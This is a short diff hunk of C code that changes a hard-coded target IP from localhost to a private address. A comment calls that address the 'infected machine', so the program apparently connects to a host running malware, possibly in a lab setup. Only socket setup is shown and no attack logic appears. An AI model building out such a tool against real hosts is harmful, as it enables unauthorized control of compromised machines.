@@ -62,7 +62,7 @@ void DBGLG(char buf[], ...){
 
 int main(int argc, char *argv[])
 {
-    char ips[] = "127.0.0.1"; // :-) IP of the "infected machine"
+    char ips[] = "172.29.176.1"; // :-) IP of the "infected machine"
 
     struct sockaddr_in servaddr;
     int ConnectSocket = 0, iResult;
